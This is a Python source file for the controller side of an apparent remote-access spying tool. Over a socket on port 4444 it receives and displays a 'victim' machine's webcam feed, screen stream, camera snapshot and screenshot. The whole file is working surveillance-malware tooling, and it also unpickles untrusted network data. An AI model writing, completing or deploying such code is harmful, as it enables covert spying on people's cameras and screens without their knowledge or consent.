import cv2
import sys, os
import pickle
import socket 
import numpy as np
from PIL import ImageGrab as ig
import time

def config(ip_address=None, port_used=None, default_ip=socket.gethostbyname(socket.gethostname()), default_port=4444):
    global s
    if ip_address is None and port_used is None:
        ip = default_ip
        port = default_port
    else:
        ip = ip_address
        port = port_used
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

def control_unit(function, ip, port):
    config(ip_address=ip, port_used=port)
    if function == "streaming_screen":
        streaming_screen()
    elif function == "streaming_camera":
        streaming_camera()
    elif function == "capture_camera":
        capture_camera()
    elif function == "screen_shoot":
        screen_shoot()

def streaming_camera():
    try:
        while True:
            data_bytes = s.recv(3147428)
            data = pickle.loads(data_bytes)
            frame = cv2.cvtColor(data, cv2.COLOR_BGR2RGB)
            cv2.imshow("victim camera", frame)
            cv2.waitKey(1)
            s.send(str("continue").encode())

    except ConnectionResetError:
        print("victim has disable the script")
        s.close()
    except ConnectionAbortedError:
        print("victim has disable the script")
        s.close()
    except KeyboardInterrupt:
        cv2.destroyAllWindows()
        s.send(str("halt").encode())
        s.close()

def streaming_screen():
    try:
        while True:
            data_bytes = s.recv(3147428)
            data = pickle.loads(data_bytes)
            frame = cv2.cvtColor(data, cv2.COLOR_BGR2RGB)
            cv2.imshow("victim screen", frame)
            cv2.waitKey(1)
            s.send(str("continue").encode())

    except ConnectionResetError:
        print("victim has disable the script")
    except ConnectionAbortedError:
        print("victim has disable the script")
        s.close()
    except KeyboardInterrupt:
        s.send(str("halt").encode())
        s.close()
        cv2.destroyAllWindows()

def capture_camera():
    data_bytes = s.recv(3147428)
    data = pickle.loads(data_bytes)
    frame = cv2.cvtColor(data, cv2.COLOR_BGR2RGB)
    cv2.imshow("victim camera capture", frame)
    cv2.waitKey(0)
    s.close()

def screen_shoot():
    data_bytes = s.recv(3147428)
    data = pickle.loads(data_bytes)
    frame = cv2.cvtColor(data, cv2.COLOR_BGR2RGB)
    cv2.imshow("victim screen capture", frame)
    cv2.waitKey(0)
    s.close()
